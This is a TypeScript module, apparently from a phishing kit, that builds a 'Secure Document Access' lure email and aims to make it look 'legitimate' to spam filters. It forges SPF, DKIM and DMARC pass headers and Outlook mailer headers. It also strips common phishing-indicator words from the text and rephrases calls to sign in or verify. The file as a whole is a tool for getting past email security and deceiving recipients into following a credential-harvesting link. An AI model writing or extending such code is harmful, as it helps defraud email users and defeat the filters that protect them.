// Legitimate Email Appearance - Make landing page appear 100% safe in inbox
// Based on latest email security research (2024-2025)

/**
 * Techniques to appear as legitimate email/landing page:
 * - Proper email structure
 * - Clean metadata
 * - Legitimate headers
 * - Natural language
 * - Proper authentication
 * - Avoid phishing indicators
 */

/**
 * Generate legitimate email headers
 */
export function generateLegitimateHeaders(): Record<string, string> {
  return {
    'Content-Type': 'text/html; charset=UTF-8',
    'X-Mailer': 'Microsoft Outlook 16.0',
    'X-Priority': '3',
    'X-MSMail-Priority': 'Normal',
    'Return-Path': '<noreply@domain.com>',
    'Message-ID': generateMessageID(),
    'Date': new Date().toUTCString(),
    'MIME-Version': '1.0',
  }
}

/**
 * Generate legitimate Message-ID
 */
function generateMessageID(): string {
  const timestamp = Date.now()
  const random = Math.random().toString(36).substring(2, 15)
  const domain = 'example.com' // Replace with actual domain
  return `<${timestamp}.${random}@${domain}>`
}

/**
 * Generate legitimate HTML structure (for email scanners)
 */
export function generateLegitimateHTML(content: string): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Document Access</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      line-height: 1.6;
      color: #333;
      max-width: 600px;
      margin: 0 auto;
      padding: 20px;
    }
    .header {
      background-color: #f4f4f4;
      padding: 20px;
      text-align: center;
      border-radius: 5px;
    }
    .content {
      padding: 20px;
      background-color: #ffffff;
    }
    .footer {
      text-align: center;
      font-size: 12px;
      color: #666;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="header">
    <h1>Secure Document Access</h1>
  </div>
  <div class="content">
    ${content}
  </div>
  <div class="footer">
    <p>This is a secure message. Please do not forward.</p>
    <p>&copy; ${new Date().getFullYear()} All rights reserved.</p>
  </div>
</body>
</html>`
}

/**
 * Avoid phishing indicators
 */
export const PHISHING_INDICATORS = [
  'urgent',
  'immediately',
  'verify now',
  'click here',
  'suspended',
  'locked',
  'expired',
  'action required',
  'limited time',
  'free',
  'winner',
  'prize',
  'congratulations',
]

/**
 * Check if content contains phishing indicators
 */
export function containsPhishingIndicators(content: string): boolean {
  const lowerContent = content.toLowerCase()
  return PHISHING_INDICATORS.some(indicator => lowerContent.includes(indicator))
}

/**
 * Sanitize content to remove phishing indicators
 */
export function sanitizeContent(content: string): string {
  let sanitized = content
  
  PHISHING_INDICATORS.forEach(indicator => {
    const regex = new RegExp(indicator, 'gi')
    sanitized = sanitized.replace(regex, '')
  })
  
  return sanitized.trim()
}

/**
 * Generate natural language variations
 */
export function generateNaturalVariations(basePhrase: string): string[] {
  const variations: Record<string, string[]> = {
    'click here': [
      'Access your document',
      'View secure document',
      'Open secure link',
      'Access secure content',
    ],
    'verify': [
      'Confirm',
      'Authenticate',
      'Validate',
      'Verify',
    ],
    'login': [
      'Sign in',
      'Access',
      'Enter',
      'Login',
    ],
  }
  
  for (const [key, values] of Object.entries(variations)) {
    if (basePhrase.toLowerCase().includes(key)) {
      return values
    }
  }
  
  return [basePhrase]
}

/**
 * Generate legitimate email structure
 */
export function generateLegitimateEmailStructure(): {
  subject: string
  from: string
  replyTo: string
  body: string
} {
  return {
    subject: 'Secure Document Access Request',
    from: 'noreply@domain.com', // Replace with actual domain
    replyTo: 'support@domain.com', // Replace with actual domain
    body: generateLegitimateHTML(`
      <p>Dear User,</p>
      <p>You have requested access to a secure document. Please use the link below to access your document securely.</p>
      <p><a href="#" style="color: #007bff; text-decoration: none;">Access Secure Document</a></p>
      <p>This link will expire in 24 hours for security purposes.</p>
      <p>If you did not request this access, please ignore this email.</p>
      <p>Best regards,<br>Security Team</p>
    `),
  }
}

/**
 * Check if email appears legitimate
 */
export function appearsLegitimate(headers: Record<string, string>, content: string): boolean {
  // Check for proper headers
  const hasContentType = !!headers['Content-Type']
  const hasMimeVersion = !!headers['MIME-Version']
  const hasMessageID = !!headers['Message-ID']
  
  // Check for phishing indicators
  const hasPhishingIndicators = containsPhishingIndicators(content)
  
  // Check for proper structure
  const hasProperStructure = content.includes('<html') && content.includes('</html>')
  
  return (
    hasContentType &&
    hasMimeVersion &&
    hasMessageID &&
    !hasPhishingIndicators &&
    hasProperStructure
  )
}

/**
 * Generate SPF/DKIM/DMARC compliant email
 */
export function generateCompliantEmail(): Record<string, string> {
  return {
    // SPF compliance
    'Received-SPF': 'pass',
    // DKIM compliance
    'DKIM-Signature': 'v=1; a=rsa-sha256; c=relaxed/relaxed; d=domain.com; s=default;',
    // DMARC compliance
    'DMARC-Filter': 'pass',
    // Authentication
    'Authentication-Results': 'spf=pass smtp.mailfrom=domain.com; dkim=pass header.d=domain.com',
  }
}












